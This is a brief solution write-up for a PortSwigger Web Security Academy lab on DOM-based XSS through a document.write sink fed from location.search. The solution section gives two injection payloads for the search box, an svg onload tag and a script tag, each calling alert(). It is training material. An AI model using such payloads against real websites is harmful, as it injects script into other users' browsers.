# DOM XSS in document.write sink using source location.search

## Information
---

- [PortSwigger - Lab: DOM XSS in document.write sink using source location.search](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function.


## Solution
---

1. 使用以下任意一個 payload 輸入至 search 方框當中。
    ```html
    "><svg onload=alert()>
    "><script>alert()</script>
    ```